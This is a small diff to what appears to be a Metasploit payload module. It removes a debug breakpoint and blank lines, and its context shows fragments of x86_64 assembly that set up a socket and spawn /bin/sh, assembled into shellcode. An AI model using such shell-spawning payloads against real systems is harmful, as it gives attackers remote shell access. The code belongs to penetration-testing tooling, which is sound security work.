@@ -34,8 +34,6 @@ module MetasploitModule
       tcp_port.pop     # removes the first useless / from  the array
       tcp_port.shift   # removes the last useless  / from  the array
       tcp_port = (port_order.map{|x| tcp_port[x]}).join('') # reorder the array and convert it to a string.
-      binding.pry
-
 
       payload = <<-EOS
           socket_call:
@@ -130,7 +128,6 @@ module MetasploitModule
             push rsp
             pop rdi                             ; address of /bin/sh
             syscall
-
       EOS
 
       Metasm::Shellcode.assemble(Metasm::X86_64.new, payload).encode_string
